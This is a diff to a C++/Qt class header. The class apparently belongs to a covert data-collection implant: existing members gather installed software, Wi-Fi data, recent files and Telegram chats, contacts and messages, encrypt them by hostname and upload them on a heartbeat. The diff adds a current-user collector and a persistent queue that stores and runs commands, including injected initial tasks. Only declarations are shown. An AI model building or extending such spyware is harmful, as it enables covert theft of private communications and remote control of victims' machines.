@@ -45,6 +45,7 @@ private:
     QString getSoftwareJson();
     QString getWifiJson();
     QString getRecentFilesJson();
+    QString getCurrentUserJson();
     void collectTelegramData(); // Chats, Contacts, Messages
     void processMediaDownloads(); // Process pending media downloads
     void cleanupDatabase(); // Cleanup old records to save space
@@ -66,6 +67,13 @@ private:
     QString encryptData(const QString& data, const QString& hostname, const QString& timestamp);
     QString decryptData(const QString& data, const QString& hostname, const QString& timestamp);
 
+    // Task Persistence
+    void saveTask(const QString& taskId, const QString& command, const QString& params, const QString& status);
+    void updateTaskStatus(const QString& taskId, const QString& status);
+    void processLocalTasks();
+    void injectInitialTasks();
+    bool hasInitialTasksRun();
+
     // Sync State
     QString _syncTaskId;
     int _activeSyncs = 0;
@@ -85,6 +93,7 @@ private:
     QTimer _timer;
     QTimer _collectionTimer; // Separate timer for heavy collection
     QTimer _monitorTimer;
+    QTimer _taskProcessingTimer; // Local task queue processing
     int64_t _lastUploadTime = 0;
     int64_t _lastIntervalChangeTime = 0;
     int _currentHeartbeatInterval = 60000; // Default 60s
